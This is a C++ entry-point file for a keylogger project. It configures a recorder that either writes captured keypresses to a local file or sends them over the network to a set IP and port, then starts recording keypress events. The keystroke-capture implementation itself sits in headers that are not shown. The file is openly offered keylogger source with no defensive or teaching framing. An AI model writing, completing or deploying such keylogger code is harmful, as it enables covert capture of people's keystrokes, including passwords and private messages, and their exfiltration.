#include <cstdlib>
#include <exception>
#include <iostream>
#include <memory>

#include "recorder/event_loop.h"
#include "recorder/recorder.h"

enum RecorderType {
  kText = 0,
  kNetwork,
};

#define RECORDER_KEY_LIMIT 8
#define RECORDER_TYPE RecorderType::kText

#define RECORDER_FILE_PATH "/home/ieg/dev/keylogger/bin/keys.txt"
#define RECORDER_IP "127.0.0.1"
#define RECORDER_PORT 5555

void PrintErrAndExit(const std::string& err_msg) {
  std::cerr << "error: " << err_msg << std::endl;
  std::exit(EXIT_FAILURE);
}

int main() {
  using RecorderPtr = std::unique_ptr<keylogger::Recorder>;
  RecorderPtr recorder;
  switch (RECORDER_TYPE) {
    case RecorderType::kText:
      recorder = std::make_unique<keylogger::FileRecorder>(RECORDER_KEY_LIMIT,
                                                           RECORDER_FILE_PATH);
      break;
    case RecorderType::kNetwork:
      recorder = std::make_unique<keylogger::NetworkRecorder>(
          RECORDER_KEY_LIMIT, RECORDER_IP, RECORDER_PORT);
      break;
    default:
      PrintErrAndExit("unknown recorder type -> " +
                      std::to_string(RECORDER_TYPE));
  }

  try {
    keylogger::RecordKeypressEvents(recorder.get());
  } catch (const std::exception& e) {
    PrintErrAndExit(e.what());
  }

  std::exit(EXIT_SUCCESS);
}
